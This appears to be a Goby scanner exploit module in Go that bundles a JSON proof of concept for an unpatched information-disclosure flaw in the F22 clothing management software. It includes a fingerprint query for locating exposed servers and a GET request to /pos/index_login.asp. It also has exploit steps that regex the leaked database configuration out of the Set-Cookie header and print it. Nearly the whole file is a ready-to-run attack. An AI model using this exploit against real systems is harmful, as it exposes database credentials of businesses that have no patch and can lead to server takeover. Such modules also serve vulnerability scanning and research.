package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "F22 clothing management software system index_login.asp sensitive information leakage",
    "Description": "<p>Guangzhou Jinmingtai Software Technology Co., Ltd. is a high -tech enterprise specializing in information solutions for brand clothing and shoe bags. The F22 clothing management software system developed by the company has a database account password information leakage information. The interface /pos/index_login.asp can get the database account password, and the attacker can eventually use the vulnerability to obtain sensitive information. Severe consequences can achieve directly obtaining server permissions.</p>",
    "Product": "F22 clothing management software system",
    "Homepage": "http://www.x2erp.com/",
    "DisclosureDate": "2022-11-21",
    "Author": "2935900435@qq.com",
    "FofaQuery": "body=\"Login_btn\" && body=\"Login_Ipt\" && body=\"login_title\"",
    "GobyQuery": "body=\"Login_btn\" && body=\"Login_Ipt\" && body=\"login_title\"",
    "Level": "3",
    "Impact": "<p>The F22 clothing management software /pos/index_login.asp developed by Guangzhou Jinmingtai Software Technology Co., Ltd. exists in the Header sensitive information leak, and the attacker can obtain sensitive information such as the system database configuration file.</p>",
    "Recommendation": "<p>1. At present, the manufacturer has not been patch yet, please pay attention to the official website update in time: <a href=\"http://www.x2erp.com/Support.aspx\">http://www.x2erp.com/Support.aspx</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/pos/index_login.asp",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Driver",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "dataBase",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/pos/index_login.asp",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Driver",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "dataBase",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "SQL_Config|lastheader|regex|Set\\-Cookie\\:\\s(.*?)\\;",
                "output|lastbody|text|Sql_config: {{{SQL_Config}}}"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.3",
    "Translation": {
        "CN": {
            "Name": "F22服装管理软件系统index_login.asp敏感信息泄露",
            "Product": "F22服装管理软件系统",
            "Description": "<p>广州锦铭泰软件科技有限公司，是一家专业为品牌服饰鞋包企业提供信息化解决方案的高科技企业，该公司开发的F22服装管理软件系统存在数据库账户密码信息泄露，通过访问未授权的接口/pos/index_login.asp就可获取到数据库账户密码，攻击者最终可利用该漏洞获取敏感信息。严重后果可达到直接获取服务器权限。<br></p>",
            "Recommendation": "<p>1、目前厂商暂未发布补丁，请及时关注官网更新：<a href=\"http://www.x2erp.com/Support.aspx\">http://www.x2erp.com/Support.aspx</a><br></p>",
            "Impact": "<p>广州锦铭泰软件科技有限公司开发的F22服装管理软件 /pos/index_login.asp存在Header敏感信息泄露，攻击者可获取系统数据库配置文件等敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "F22 clothing management software system index_login.asp sensitive information leakage",
            "Product": "F22 clothing management software system",
            "Description": "<p>Guangzhou Jinmingtai Software Technology Co., Ltd. is a high -tech enterprise specializing in information solutions for brand clothing and shoe bags. The F22 clothing management software system developed by the company has a database account password information leakage information. The interface /pos/index_login.asp can get the database account password, and the attacker can eventually use the vulnerability to obtain sensitive information. Severe consequences can achieve directly obtaining server permissions.<br></p>",
            "Recommendation": "<p>1. At present, the manufacturer has not been patch yet, please pay attention to the official website update in time: <a href=\"http://www.x2erp.com/Support.aspx\">http://www.x2erp.com/Support.aspx</a><br></p>",
            "Impact": "<p>The F22 clothing management software /pos/index_login.asp developed by Guangzhou Jinmingtai Software Technology Co., Ltd. exists in the Header sensitive information leak, and the attacker can obtain sensitive information such as the system database configuration file.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}